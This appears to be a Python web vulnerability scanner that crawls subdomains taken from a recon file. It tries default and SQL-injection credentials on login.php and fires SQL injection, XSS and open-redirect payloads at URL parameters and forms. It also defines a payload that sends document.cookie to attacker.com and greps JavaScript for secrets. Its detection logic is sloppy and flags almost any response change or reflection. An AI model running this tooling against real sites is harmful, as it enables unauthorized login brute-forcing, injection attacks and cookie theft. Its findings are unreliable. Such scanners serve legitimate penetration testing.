import json
import requests
import time
import html
from urllib.parse import urljoin, parse_qs, urlparse, quote
from bs4 import BeautifulSoup
import re
import jsbeautifier

# Enhanced SQL Injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' UNION SELECT null, version() -- ",
    "' UNION SELECT null, user() -- ",
    "' UNION SELECT null, database() -- ",
    "1' AND SLEEP(5) -- ",  # Blind SQLi
    "1' AND 1=2 -- "       # Boolean-based Blind SQLi
    "admin ' OR 1=1 --' "
]

# Enhanced XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "\"><script>alert('XSS')</script>",
    "<input onfocus=alert('XSS') autofocus>",
    "'-alert('XSS')-'"
]

# CSRF test payload
CSRF_PAYLOAD = "<img src='http://attacker.com/steal?token=' + document.cookie>"

# Sensitive keywords for JavaScript scanning
SENSITIVE_KEYWORDS = [
    'api_key', 'secret', 'password', 'credentials', 'token',
    'aws_', 'azure_', 'google_', 'access_key', 'client_secret',
    'private_key', 'jwt', 'oauth', 'bearer', 'authorization'
]

def load_recon_results(file_path):
    with open(file_path, 'r') as file:
        return json.load(file)

def scan_javascript_files(session, all_links, results):
    print("[+] Scanning JavaScript files for sensitive data...")
    js_vulnerabilities = []
    js_files = [link for link in all_links if link.endswith('.js')]
    for js_url in js_files:
        try:
            response = session.get(js_url)
            beautified_js = jsbeautifier.beautify(response.text)
            sensitive_findings = []
            for keyword in SENSITIVE_KEYWORDS:
                matches = re.findall(r'(["\'].*?{keyword}.*?["\']|\b{keyword}\b)'.format(keyword=keyword),
                                     beautified_js, re.IGNORECASE)
                if matches:
                    sensitive_findings.extend(matches)
            if sensitive_findings:
                print(f"[!] Sensitive data found in {js_url}")
                js_vulnerabilities.append({"url": js_url, "sensitive_matches": sensitive_findings})
        except requests.RequestException as e:
            print(f"[-] Error scanning JavaScript file {js_url}: {e}")
    results["javascript_vulnerabilities"] = js_vulnerabilities
    return js_vulnerabilities

def get_csrf_token(session, login_url):
    try:
        response = session.get(login_url)
        soup = BeautifulSoup(response.text, "html.parser")
        token_field = soup.find("input", {"name": re.compile(r'csrf|token|authenticity', re.I)})
        if token_field:
            token = token_field.get("value")
            print(f"[*] Found CSRF token: {token}")
            return token
        print("[-] No CSRF token found on login page.")
        return None
    except requests.RequestException as e:
        print(f"[-] Error fetching CSRF token: {e}")
        return None

def login(session, login_url, creds, results):
    print(f"[+] Attempting to login at {login_url} with test credentials...")
    for username, password in creds:
        print(f"[*] Trying: {username}/{password}")
        login_page = session.get(login_url)
        soup = BeautifulSoup(login_page.text, "html.parser")
        csrf_token = None
        token_field = soup.find("input", {"name": "user_token"}) or \
                      soup.find("input", {"name": "csrf_token"}) or \
                      soup.find("input", {"name": "token"})
        if token_field:
            csrf_token = token_field.get("value")
            print(f"[*] Found CSRF token: {csrf_token}")
        login_data = {"username": username, "password": password, "Login": "Login"}
        if csrf_token:
            login_data["user_token"] = csrf_token
        response = session.post(login_url, data=login_data)
        if "logout" in response.text.lower() or "welcome" in response.text.lower():
            print(f"[+] Login successful with: {username}/{password}")
            results["login_success"] = {"username": username, "password": password}
            return response
    print("[-] Failed to log in with any of the test credentials")
    return None

EXCLUDED_DOMAINS = [
    "youtube.com", "facebook.com", "twitter.com", "linkedin.com",
    "instagram.com", "tiktok.com", "google.com"
]

def extract_forms_and_links(response_text, base_url):
    soup = BeautifulSoup(response_text, "html.parser")
    links = set()
    forms = []
    parsed_base = urlparse(base_url)
    base_domain = parsed_base.netloc
    print("[+] Extracting links...")
    for link in soup.find_all('a', href=True):
        href = link.get('href')
        if href and not href.startswith(('mailto:', 'tel:', '#', 'javascript:')):
            full_url = urljoin(base_url, href)
            parsed_link = urlparse(full_url)
            if parsed_link.netloc and parsed_link.netloc != base_domain:
                if any(excluded in parsed_link.netloc for excluded in EXCLUDED_DOMAINS):
                    print(f"[-] Skipping external/unwanted link: {full_url}")
                    continue
            links.add(full_url)
            print(f"[*] Found link: {full_url}")
    print("[+] Extracting forms...")
    for form in soup.find_all('form'):
        form_data = {
            'action': urljoin(base_url, form.get('action', '')),
            'method': form.get('method', 'get').lower(),
            'inputs': []
        }
        for input_field in form.find_all(['input', 'textarea', 'select']):
            input_type = input_field.get('type', '')
            input_name = input_field.get('name', '')
            if input_type not in ['submit', 'button', 'image'] and input_name:
                form_data['inputs'].append({'name': input_name, 'type': input_type})
        if form_data['inputs']:
            forms.append(form_data)
            print(f"[*] Found form: {form_data['action']} (Method: {form_data['method']}, Inputs: {[i['name'] for i in form_data['inputs']]})")
    print(f"[+] Extracted {len(links)} links and {len(forms)} forms")
    return list(links), forms

def find_url_parameters(links):
    print("[+] Identifying URLs with parameters...")
    vulnerable_urls = []
    seen_urls = set()
    for link in links:
        parsed = urlparse(link)
        base_url = parsed.scheme + "://" + parsed.netloc + parsed.path
        if base_url in seen_urls:
            continue
        params = parse_qs(parsed.query)
        if params:
            seen_urls.add(base_url)
            vulnerable_urls.append({'url': link, 'params': list(params.keys())})
            print(f"[*] Found URL with parameters: {link} (Params: {list(params.keys())})")
    print(f"[+] Found {len(vulnerable_urls)} unique URLs with parameters")
    return vulnerable_urls

def is_sql_injected(response_normal, response_sqli):
    """
    Detects SQL Injection by comparing normal and SQLi response sizes and content.
    """
    if len(response_sqli.text) > len(response_normal.text) * 1.3:  # 30% larger response
        return f"Response size increased: {len(response_sqli.text)} vs {len(response_normal.text)}"
    
    if response_sqli.text != response_normal.text:  # Structural changes
        return "Response content changed significantly"
    
    return None

def test_sql_injection(session, targets, results):
    print("[+] Scanning for SQL Injection vulnerabilities...")
    sql_vulns = []
    tested_urls = set()
    tested_forms = set()
    
    # Test URL parameters
    for target in targets.get('url_params', []):
        base_url = target['url'].split('?')[0]
        for param in target['params']:
            for payload in SQL_PAYLOADS:
                vuln_key = f"{base_url}|{param}|{payload}"
                parsed = urlparse(target['url'])
                params = parse_qs(parsed.query)

                test_payloads = [payload, quote(payload)]
                for test_payload in test_payloads:
                    params[param] = [test_payload]
                    query_string = '&'.join([f"{k}={v[0]}" for k, v in params.items()])
                    test_url = f"{base_url}?{query_string}"

                    for method in [session.get, session.post]:
                        vuln_method_key = f"{vuln_key}|{method.__name__}"
                        if vuln_method_key in tested_urls:
                            continue
                        tested_urls.add(vuln_method_key)

                        try:
                            # Step 1: Send a normal request
                            response_normal = session.get(target['url'])

                            # Step 2: Send an SQLi request
                            if method == session.post:
                                response_sqli = method(base_url, data={param: test_payload})
                            else:
                                response_sqli = method(test_url)

                            # Step 3: Handle 404 responses
                            if response_sqli.status_code == 404:
                                print(f"[-] Skipping {test_url} (404 Not Found)")
                                continue

                            # Step 4: Compare responses for SQLi evidence
                            evidence = is_sql_injected(response_normal, response_sqli)
                            if evidence:
                                print(f"[!] Possible SQL Injection at {test_url} (Method: {method.__name__})")
                                sql_vulns.append({
                                    "url": test_url, "parameter": param, "payload": test_payload,
                                    "method": method.__name__, "evidence": evidence
                                })

                            # Step 5: Blind SQLi Detection (Time-Based)
                            if "SLEEP" in test_payload:
                                start_time = time.time()
                                method(test_url) if method == session.get else method(base_url, data={param: test_payload})
                                elapsed = time.time() - start_time
                                if elapsed > 4:
                                    print(f"[!] Possible Blind SQL Injection at {test_url} (Method: {method.__name__})")
                                    sql_vulns.append({
                                        "url": test_url, "parameter": param, "payload": test_payload,
                                        "method": method.__name__, "evidence": f"Time delay: {elapsed:.2f}s"
                                    })

                        except requests.RequestException as e:
                            print(f"[-] Error testing SQLi at {test_url}: {e}")

    # Test forms
    print(f"[DEBUG] Testing {len(targets.get('forms', []))} forms for SQLi")
    for form in targets.get('forms', []):
        form_action = form['action']
        print(f"[DEBUG] Testing form: {form_action} (Method: {form['method']})")

        for input_field in form['inputs']:
            for payload in SQL_PAYLOADS:
                vuln_key = f"{form_action}|{input_field['name']}|{payload}"
                test_payloads = [payload, quote(payload)]

                for test_payload in test_payloads:
                    vuln_method_key = f"{vuln_key}|{form['method']}"
                    if vuln_method_key in tested_forms:
                        print(f"[DEBUG] Skipping already tested: {vuln_method_key}")
                        continue
                    tested_forms.add(vuln_method_key)

                    form_data = {input_field['name']: test_payload}

                    try:
                        # Step 1: Send a normal form request
                        form_data_normal = {input_field['name']: "test123"}
                        response_normal = session.post(form_action, data=form_data_normal)

                        # Step 2: Send an SQLi form request
                        if form['method'] == 'post':
                            response_sqli = session.post(form_action, data=form_data)
                        else:
                            response_sqli = session.get(form_action, params=form_data)

                        # Step 3: Handle 404 responses
                        if response_sqli.status_code == 404:
                            print(f"[-] Skipping form {form_action} (404 Not Found)")
                            continue

                        # Step 4: Compare responses
                        evidence = is_sql_injected(response_normal, response_sqli)
                        if evidence:
                            print(f"[!] Possible SQL Injection in form {form_action} (Field: {input_field['name']})")
                            sql_vulns.append({
                                "form_action": form_action, "field": input_field['name'],
                                "payload": test_payload, "method": form['method'], "evidence": evidence
                            })

                        # Step 5: Blind SQLi Detection (Time-Based)
                        if "SLEEP" in test_payload:
                            start_time = time.time()
                            session.post(form_action, data=form_data) if form['method'] == 'post' else session.get(form_action, params=form_data)
                            elapsed = time.time() - start_time
                            if elapsed > 4:
                                print(f"[!] Possible Blind SQL Injection in form {form_action} (Field: {input_field['name']})")
                                sql_vulns.append({
                                    "form_action": form_action, "field": input_field['name'],
                                    "payload": test_payload, "method": form['method'],
                                    "evidence": f"Time delay: {elapsed:.2f}s"
                                })

                    except requests.RequestException as e:
                        print(f"[-] Error testing SQLi in form {form_action}: {e}")

    results["sql_injection"] = sql_vulns
    return len(sql_vulns) > 0

def detect_sql_error(response_text):
    error_patterns = [
        r"(error|syntax|SQL syntax|mysql_fetch|sql|database)",
        r"(ORA-|postgres|SQLSTATE|sqlite)",
        r"(you have an error in your sql|unclosed quotation)",
        r"(unknown column|invalid query|sql server error)",
        r"(mysql server version|prepared statement)",
        r"mysql"  # Broader catch for DVWA-like apps
    ]
    for pattern in error_patterns:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return match.group(0)
    return None

def test_xss(session, targets, results):
    print("[+] Testing for XSS vulnerabilities...")
    xss_vulns = []
    tested_urls = set()
    tested_forms = set()
    
    for target in targets['url_params']:
        base_url = target['url'].split('?')[0]
        for param in target['params']:
            for payload in XSS_PAYLOADS:
                vuln_key = f"{base_url}|{param}|{payload}"
                test_payloads = [payload, quote(payload)]
                for test_payload in test_payloads:
                    parsed = urlparse(target['url'])
                    params = parse_qs(parsed.query)
                    params[param] = [test_payload]
                    query_string = '&'.join([f"{k}={v[0]}" for k, v in params.items()])
                    test_url = f"{base_url}?{query_string}"
                    for method in [session.get, session.post]:
                        vuln_method_key = f"{vuln_key}|{method.__name__}"
                        if vuln_method_key in tested_urls:
                            continue
                        tested_urls.add(vuln_method_key)
                        print(f"[DEBUG] Testing URL: {test_url} (Method: {method.__name__}, Payload: {test_payload})")
                        try:
                            if method == session.post:
                                response = method(base_url, data={param: test_payload})
                            else:
                                response = method(test_url)
                            if detect_xss_reflection(response.text, test_payload):
                                print(f"[!] Possible XSS at {test_url} (Method: {method.__name__})")
                                xss_vulns.append({
                                    "url": test_url, "parameter": param, "payload": test_payload,
                                    "method": method.__name__
                                })
                        except requests.RequestException as e:
                            print(f"[-] Error testing XSS at {test_url}: {e}, Response: {getattr(e.response, 'text', 'N/A')[:100]}")

    print(f"[DEBUG] Testing {len(targets['forms'])} forms for XSS")
    for form in targets['forms']:
        form_action = form['action']
        print(f"[DEBUG] Testing form: {form_action} (Method: {form['method']})")
        for input_field in form['inputs']:
            for payload in XSS_PAYLOADS:
                vuln_key = f"{form_action}|{input_field['name']}|{payload}"
                test_payloads = [payload, quote(payload)]
                for test_payload in test_payloads:
                    vuln_method_key = f"{vuln_key}|{form['method']}"
                    if vuln_method_key in tested_forms:
                        print(f"[DEBUG] Skipping already tested: {vuln_method_key}")
                        continue
                    tested_forms.add(vuln_method_key)
                    print(f"[DEBUG] Testing input: {input_field['name']} in {form_action} with {test_payload}")
                    form_data = {input_field['name']: test_payload}
                    try:
                        if form['method'] == 'post':
                            response = session.post(form_action, data=form_data)
                        else:
                            response = session.get(form_action, params=form_data)
                        if detect_xss_reflection(response.text, test_payload):
                            print(f"[!] Possible XSS in form {form_action} (Field: {input_field['name']})")
                            xss_vulns.append({
                                "form_action": form_action, "field": input_field['name'],
                                "payload": test_payload, "method": form['method']
                            })
                    except requests.RequestException as e:
                        print(f"[-] Error testing XSS in form {form_action}: {e}, Response: {getattr(e.response, 'text', 'N/A')[:100]}")

    results["xss"] = xss_vulns
    return len(xss_vulns) > 0

def detect_xss_reflection(response_text, payload):
    try:
        # Check for direct reflection or partial reflection
        if payload in response_text or any(part in response_text for part in re.split(r"['\"<>=]", payload) if len(part) > 3):
            soup = BeautifulSoup(response_text, "html.parser")
            contexts = [
                (soup.find_all('script'), lambda tag: tag.string and payload in tag.string),
                (soup.find_all(True), lambda tag: any(
                    attr_name.startswith('on') and payload in str(attr_value)
                    for attr_name, attr_value in tag.attrs.items()
                )),
                (soup.find_all('a'), lambda tag: 'href' in tag.attrs and
                    'javascript:' in tag['href'] and payload in tag['href']),
                (soup.find_all(style=True), lambda tag: payload in tag['style'] and
                    any(x in tag['style'] for x in ['expression', 'javascript:', 'url(']))
            ]
            for tags, condition in contexts:
                if any(condition(tag) for tag in tags):
                    return True
            encoded = html.escape(payload)
            if encoded != payload and encoded not in response_text:
                return True
            return True  # Reflects without encoding
        return False
    except Exception as e:
        print(f"[-] Error in XSS reflection detection: {e}")
        return payload in response_text

def test_csrf(session, forms, results):
    print("[+] Testing for CSRF vulnerabilities...")
    csrf_vulns = []
    for form in forms:
        has_csrf_token = any(re.search(r'(csrf|token|nonce)', input_field['name'], re.IGNORECASE)
                             for input_field in form['inputs'])
        if not has_csrf_token and form['method'] == 'post':
            print(f"[!] Possible CSRF vulnerability in form: {form['action']}")
            csrf_vulns.append({"form_action": form['action'], "method": form['method']})
    results["csrf"] = csrf_vulns
    return len(csrf_vulns) > 0

def test_open_redirect(session, targets, results):
    print("[+] Testing for open redirect vulnerabilities...")
    redirect_vulns = []
    redirect_params = ['redirect', 'url', 'next', 'redir', 'return', 'returnto', 'goto', 'target']
    redirect_payloads = ['https://evil.com', '//evil.com', 'javascript:alert("Open Redirect")']
    for target in targets['url_params']:
        base_url = target['url'].split('?')[0]
        for param in target['params']:
            if param.lower() in redirect_params:
                for payload in redirect_payloads:
                    parsed = urlparse(target['url'])
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    query_string = '&'.join([f"{k}={v[0]}" for k, v in params.items()])
                    test_url = f"{base_url}?{query_string}"
                    try:
                        response = session.get(test_url, allow_redirects=False)
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if payload in location:
                                print(f"[!] Possible open redirect vulnerability at: {test_url}")
                                redirect_vulns.append({
                                    "url": test_url, "parameter": param, "payload": payload,
                                    "redirected_to": location
                                })
                    except requests.RequestException as e:
                        print(f"[-] Error testing open redirect at {test_url}: {e}")
    results["open_redirect"] = redirect_vulns
    return len(redirect_vulns) > 0

def crawl_website(session, target_url, depth=2):
    print(f"[+] Crawling website starting from {target_url} with depth {depth}...")
    visited = set()
    to_visit = {target_url}
    all_links = set()
    all_forms = []
    for _ in range(depth):
        current_level = to_visit.copy()
        to_visit = set()
        for url in current_level:
            if url in visited or not url.startswith(target_url):
                continue
            visited.add(url)
            print(f"[*] Crawling: {url}")
            try:
                response = session.get(url)
                links, forms = extract_forms_and_links(response.text, url)
                all_links.update(links)
                all_forms.extend([f for f in forms if f not in all_forms])
                to_visit.update(link for link in links
                                if link not in visited and link.startswith(target_url))
            except requests.RequestException as e:
                print(f"[-] Error crawling {url}: {e}")
    print(f"[+] Crawling complete. Found {len(all_links)} unique links and {len(all_forms)} forms.")
    return list(all_links), all_forms

def scan_vulnerabilities(recon_data):
    results = {
        "subdomains": {},
        "total_vulnerabilities": {
            "sql_injection": 0, "xss": 0, "csrf": 0, "open_redirect": 0, "javascript_vulnerabilities": 0
        }
    }
    subdomains = recon_data.get('subdomains', [])
    if not subdomains:
        print("[-] No subdomains found in reconnaissance results")
        return results
    
    test_creds = [
        ("admin", "password"), ("admin", "admin123"), ("admin", "admin"),
        ("administrator", "password"), ("administrator", "admin"),
        ("user", "user"), ("user", "password"), ("guest", "guest"),
        ("test", "test"), ("root", "root"), ("root", "toor"), ("root", "password"),
        ("admin", "' OR '1'='1' --"), ("admin", "' OR 1=1 --")
    ]
    
    for subdomain in subdomains:
        print(f"\n[+] Scanning subdomain: {subdomain}")
        for protocol in ['http', 'https']:
            target_url = f"{protocol}://{subdomain}"
            login_url = urljoin(target_url, "/login.php")
            subdomain_results = {
                "login_success": None, "sql_injection": [], "xss": [], "csrf": [],
                "open_redirect": [], "crawled_pages": [], "forms_found": [],
                "javascript_vulnerabilities": []
            }
            try:
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                })
                test_response = session.get(target_url, timeout=10, allow_redirects=True)
                print(f"[+] Target {target_url} is accessible. Status code: {test_response.status_code}")
                
                print("[+] Crawling public part of the website...")
                public_links, public_forms = crawl_website(session, target_url, depth=1)
                subdomain_results["crawled_pages"].extend(public_links)
                subdomain_results["forms_found"].extend([{
                    "action": form["action"], "method": form["method"],
                    "inputs": [input_field["name"] for input_field in form["inputs"]]
                } for form in public_forms])
                
                post_login_response = login(session, login_url, test_creds, subdomain_results)
                if post_login_response:
                    print("[+] Successfully logged in. Crawling authenticated part...")
                    auth_links, auth_forms = crawl_website(session, target_url, depth=2)
                    subdomain_results["crawled_pages"].extend([link for link in auth_links if link not in public_links])
                    for form in auth_forms:
                        form_info = {
                            "action": form["action"], "method": form["method"],
                            "inputs": [input_field["name"] for input_field in form["inputs"]]
                        }
                        if form_info not in subdomain_results["forms_found"]:
                            subdomain_results["forms_found"].append(form_info)
                    all_forms = public_forms + auth_forms
                    all_links = public_links + auth_links
                else:
                    print("[-] Failed to log in. Only testing public pages.")
                    all_forms = public_forms
                    all_links = public_links
                
                vulnerable_urls = find_url_parameters(all_links)
                targets = {'url_params': vulnerable_urls, 'forms': all_forms}
                print(f"[DEBUG] Targets prepared: {len(targets['url_params'])} URLs, {len(targets['forms'])} forms")
                print(f"[DEBUG] Forms to test: {[form['action'] for form in targets['forms']]}")
                
                print("[DEBUG] Starting SQLi test")
                test_sql_injection(session, targets, subdomain_results)
                print("[DEBUG] Starting XSS test")
                test_xss(session, targets, subdomain_results)
                print("[DEBUG] Starting CSRF test")
                test_csrf(session, all_forms, subdomain_results)
                print("[DEBUG] Starting Open Redirect test")
                test_open_redirect(session, targets, subdomain_results)
                scan_javascript_files(session, all_links, subdomain_results)
                
                results["subdomains"][subdomain] = subdomain_results
                results["total_vulnerabilities"]["sql_injection"] += len(subdomain_results["sql_injection"])
                results["total_vulnerabilities"]["xss"] += len(subdomain_results["xss"])
                results["total_vulnerabilities"]["csrf"] += len(subdomain_results["csrf"])
                results["total_vulnerabilities"]["open_redirect"] += len(subdomain_results["open_redirect"])
                results["total_vulnerabilities"]["javascript_vulnerabilities"] += len(subdomain_results["javascript_vulnerabilities"])
                break
            except requests.RequestException as e:
                print(f"[-] Error: Cannot reach target at {target_url}: {e}")
                continue
    
    with open("scan_results.json", "w") as f:
        json.dump(results, f, indent=4)
    print("\n[+] Scan completed. Results saved to scan_results.json")
    print("\n[+] Vulnerability Scan Summary:")
    for vuln_type, count in results["total_vulnerabilities"].items():
        print(f"  - {vuln_type.replace('_', ' ').title()}: {count}")
    return results

if __name__ == "__main__":
    recon_data = load_recon_results("../recon/recon_results.json")
    scan_vulnerabilities(recon_data)
